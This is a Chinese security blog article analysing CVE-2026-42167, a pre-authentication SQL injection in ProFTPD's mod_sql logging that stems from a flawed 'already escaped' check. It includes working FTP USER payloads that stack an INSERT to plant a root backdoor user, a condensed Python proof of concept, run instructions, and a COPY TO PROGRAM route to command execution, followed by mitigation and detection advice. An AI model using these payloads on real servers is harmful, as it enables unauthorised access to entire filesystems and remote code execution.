---
title: FTP一条USER拿整个文件系统
url: https://mp.weixin.qq.com/s/St8D_a_IzqsPh4fy_7IXVw
source: Doonsec's feed
date: 2026-10-05
fetch_date: 2026-10-06T08:22:51.361643
---

# FTP一条USER拿整个文件系统

# FTP一条USER拿整个文件系统

原创

Red Hunter
Red Hunter

黑白之道

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

![](https://mmbiz.qpic.cn/mmbiz_png/nGzNudUIJ6PaAms2a5Vxib6n132yQcZOmqnQApEUWKHemA39hUNh2GdicNrV2hNOdyFjPUPeMPoPmTCdYTJlZhib7CTa4ib3og9aeicHf6IdufKk/640?from=appmsg)
> **导语**：ZeroPath Research 近日披露 ProFTPD（专业的 FTP 服务器程序） mod\_sql 日志管线里的"已转义"启发式缺陷——编号 **CVE-2026-42167**，CVSS（通用漏洞评分系统） 8.1。攻击者只需发一个 `USER` 命令，连密码都不用输，就能在 SQL 日志 INSERT 里堆叠任意语句。Shodan 上能看到的 16 万公开实例里，估算至少 1% 是预认证可打的。本文拆这条链，附官方 PoC（概念验证代码）。

---

## 一、漏洞一句话

ProFTPD 1.3.9 及以下 + 启用了 mod\_sql 日志 + 日志语句用 `%U`/`%f` 这类攻击者可控变量 → **预认证 SQL 注入**。

修复版本：1.3.9a（commit `af90843baf7dcb8c6be1e5261be2d0b5b5850673`）。

## 二、根因：is\_escaped\_text() 这个"自欺欺人"的判定

漏洞点在 `contrib/mod_sql.c` 的两段紧挨着的代码里。

第一段是判定函数，逻辑就是"看起来像已转义的字符串就跳过转义"：

```
static int is_escaped_text(const char *text, size_t text_len) {
    if (text[0] != '\'')            return FALSE;
    if (text[text_len-1] != '\'')   return FALSE;
    for (i = 1; i < text_len-1; i++)
        if (text[i] == '\'')        return FALSE;
    return TRUE;
}
```

第二段是写入处——`is_escaped_text()` 返回 TRUE 就**完全跳过 `sql_escapestring()`**：

```
if (is_escaped_text(text, text_len) == FALSE) {
    /* 这里才会做真正的 SQL 转义 */
} else {
    pr_trace_msg(trace_channel, 17,
        "text '%s' is already escaped, skipping escaping it again", text);
    new_text = (char *)text;   // ← 原样送进 query
    new_textlen = text_len;
}
```

作者本意是处理"上游已经把值拼成 `'foo'` 这种形式"的场景，但攻击者只需要自己把值也写成 `'xxx'` 的形式就能 100% 绕过——这是个**纯语法层、可被攻击者伪造**的判定。

![is_escaped_text() 绕过链路](https://mmbiz.qpic.cn/sz_mmbiz_png/nGzNudUIJ6MQhHzmJnLVwwXicictAIFZ3VCZhvQMdWXlRaqCA2mMeKIcTAan2ic11y7MedmwRicibibD85fibFpVSYAtP6iaDMQNSCSJjm7nPlNWHPs/640?from=appmsg "is_escaped_text() 绕过链路")

## 三、攻击链：FTP USER 名 → SQL INSERT

ProFTPD 默认的 mod\_sql 日志配置长这样：

```
SQLNamedQuery log_activity INSERT "'%U', '%r', '%m'" activity_log
SQLLog        *           log_activity
SQLLog        ERR_*       log_activity
```

`%U` 是"原始 USER 名"，**认证前就设好了**；`%r` 是完整 FTP 命令；`%m` 是 FTP 动词。`SQLLog ERR_*` 的意思是"失败命令触发"——意味着**用户登录失败都会触发一次 INSERT**。

攻击者只要发：

```
USER ' || (SELECT 1) ||'
```

替换进去，原语句变成：

```
INSERT '' || (SELECT 1) || '', '<完整命令>', '<动词>'  INTO activity_log
```

——也就是"插一个空串拼上子查询拼上空串"。判定函数看到首尾是单引号、中间没有单引号，**直接放行**。

更狠的玩法是堆叠（PostgreSQL/SQLite 支持 `;` 分隔的 SQL 语句，MySQL 默认不行）：

```
USER ', null, null); INSERT INTO users VALUES($$backdoor$$, $$pwned123$$, 0, 0, $$/$$, $$/bin/bash$$); --'
```

美元符 `` 是 PostgreSQL 的美元符引用语法，避免 payload 内部出现单引号。注入后，攻击者直接以 `backdoor / pwned123` 登录，拿到 `uid=0`、`homedir=/` 的 FTP 访问权——\*\*等于直接拥有整个文件系统\*\*。

## 四、实际危害：RCE / 认证绕过 / 凭据提取 / 配额逃逸

ZeroPath 把利用分四个场景，前两个杀伤力最大：

| 场景 | 触发条件 | 影响 |
| --- | --- | --- |
| **认证绕过 + 提权** | mod\_sql 启用了 `SQLAuthenticate users` | 堆叠 INSERT 后门用户，登录即得全盘 |
| **RCE（PostgreSQL 主机）** | ProFTPD 用 PG 超级用户连库 | `COPY (SELECT 1) TO PROGRAM 'cmd'` 在 DB 主机执行任意命令 |
| **凭据盲注** | 任意能注入的部署 | 用 `pg_sleep()` 做时序盲注（一种通过响应延迟逐字符提取数据的攻击手法），把 `users` 表里明文/哈希密码全抽走 |
| **配额逃逸** | 启用了 `mod_quotatab_sql` | 直接 UPDATE（修改）配额表绕过限制 |

RCE 的原理是 PostgreSQL 的 `COPY TO PROGRAM`：把子查询结果交给 shell 命令处理。ZeroPath 在 PoC 里就演示了这一招——PostgreSQL 主机被 ProFTPD DB 角色跑成什么用户，攻击者就拿到什么 shell。

## 五、PoC：5 个脚本，覆盖预认证/认证后/盲注三种路径

官方 PoC 仓库在 github.com/ZeroPathAI/proftpd-CVE-2026-42167-poc，全部用 Python 标准库，**没有第三方依赖**：

| 文件 | 触发变量 | 危害 | 所需权限 |
| --- | --- | --- | --- |
| `pocs/preauth_user_backdoor.py` | `%U` （USER 命令） | 植入后门用户 | 仅网络可达 |
| `pocs/preauth_user_rce.py` | `%U` | PG 主机 RCE | 仅网络可达 + PG 超级用户 |
| `pocs/postauth_stor_backdoor.py` | `%{basename}` （STOR 文件名） | 植入后门用户 | 任意 FTP 账号（匿名通杀） |
| `pocs/postauth_stor_rce.py` | `%{basename}` | PG 主机 RCE | 任意 FTP 账号 + PG 超级用户 |
| `pocs/postgres_blind_dump.py` | `%U` | 盲注抽 users 表 | 仅网络可达 + 最小 INSERT 权限 |

预认证后门注入的核心代码就这一段（精简自 `preauth_user_backdoor.py`）：

```
payload = (
    "', null, null); "
    "INSERT INTO users VALUES("
    "$$backdoor$$, $$pwned123$$, 0, 0, $$/$$, $$/bin/bash$$"
    "); --'"
)
# 验证 payload 满足 is_escaped_text() 的判定（首尾单引号、内部无单引号）
assert payload[0] == "'"and payload[-1] == "'"and"'"notin payload[1:-1]

# 发送 USER 命令触发注入；登录肯定失败（密码是乱填的），但 ERR_* 日志会先命中
ftp_cmd(host, port, [f"USER {payload}", "PASS x", "QUIT"])

# 等日志 INSERT 落库后，用植入的用户名+密码正式登录
ftp_cmd(host, port, ["USER backdoor", "PASS pwned123", "PWD", "QUIT"])
# 成功的话 PWD 返回 "/"，说明 homedir 是根目录
```

完整跑法：

```
git clone https://github.com/ZeroPathAI/proftpd-CVE-2026-42167-poc
cd proftpd-CVE-2026-42167-poc
cd setup
./setup.sh      # 自动起 Docker（ProFTPD + PostgreSQL + 种子数据）
# 跟着脚本打印的提示跑 PoC
uv run --no-project ../pocs/preauth_user_backdoor.py --host 127.0.0.1 --port 2121
```

`setup.sh` 会把 ProFTPD 源码拉到本地、用 `--with-modules=mod_sql:mod_sql_postgres` 编译，再起容器——第一次跑要 2-3 分钟，之后直接秒级复用。

## 六、修复与缓解

* **必须升级**：1.3.9a（commit `af90843baf7dcb8c6be1e5261be2d0b5b5850673`）。
* **临时缓解**：关掉 `mod_sql` 日志（`SQLLog` 全部注释）。
* **检测**：盯着 ProFTPD 日志里 SQL INSERT 失败/异常的请求；监控 PostgreSQL 的 `COPY TO PROGRAM` 调用。
* **审计**：所有 `mod_sql` 依赖的功能（认证、配额、ban 名单）都默认已被污染，复查数据库内容。

## 七、给红队/蓝队的几点启示

1. **"已转义"启发式是反模式**。任何"看起来像 X 就跳过 X"的优化，都会被攻击者伪造。安全判定只能基于真实可信源，而不是值的形状。
2. **配置依赖型漏洞最难找**。这条链要 mod\_sql 启用 + 日志启用 + 特定变量组合才会触发，静态分析器很容易漏；ZeroPath 用了 LLM 辅助才把"语义层的意图错误"挖出来。
3. **`%U` 是认证前的关键 sink（数据汇聚点）**。所有 FTP 服务里这种"认证前就解析的输入"都要审计——不只是 ProFTPD，vsftpd、FileZilla Server、Pure-FTPd 都得过一遍。
4. **PoC 用美元符引用避免 payload 内单引号**。这是 PostgreSQL payload 的标准技巧，写注入工具的时候直接抄。

---

**官方 PoC 仓库**：github.com/ZeroPathAI/proftpd-CVE-2026-42167-poc（5 个 Python 脚本 + Docker 一键环境）

**技术原文**：ZeroPath Research · CVE-2026-42167 Allows Auth Bypass And RCE In ProFTPD

**补丁 commit**：af90843

**CVE 详情**：CVE-2026-42167

---

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nGzNudUIJ6PAwjunDvVNE7Hh7lZaojzUoDt6Z302NAkhClPd69PPoE8ZdfGS4PMeoXib8fkYwabwzPA62zI32c7frjRmjpb6VE06FSF6J9EA/640?from=appmsg)

[![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nGzNudUIJ6OSAaKvfvFZXXO3o5SVmksIhDHMnic4ibgGvMrzWbSslwiaU3tq3quP8r8CyX75bJbdzV6dGBNlqYpLuKxU8KPo975mcgeed9fkDs/640?from=appmsg)](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650621549&idx=1&sn=21c4b072726d2387d562109ada6b9bbb&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nGzNudUIJ6NNoia1EGrLClaUj1WdkQCjqdiaEeqpAoy68sKOmsI4GjbrfiauUNJCialIbtVvDI1NibLUG58ytNgcQAOdXqDmSJcOBf9CrDQCruibA/640?from=appmsg)](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650621944&idx=1&sn=3cc6dc9876a20466d4ec3634deb80220&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nGzNudUIJ6NhIyDggicArYoqdUKD6JiaK9z7KqoppwZAHc77VzX52tn52y2ZOLzA8JZS5Dc1wkwFxheLCibpWQibic232iaRn32icbVlic11BqCy2KU/640?from=appmsg)](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650622065&idx=1&sn=09f8ae84c06d4331e71c277b177ae701&scene=21#wechat_redirect)

> 👇 点击**阅读原文**，访问我的网站

---

预览时标签不可点

阅读原文

不喜欢

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLicpdp8GZxicJpcFIZglvakzYRZiaqt6W61hfgibjeymOgiaGqRsgNvgWIacMj7Gk4PIZ4o2NtW1zb9P6Q/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过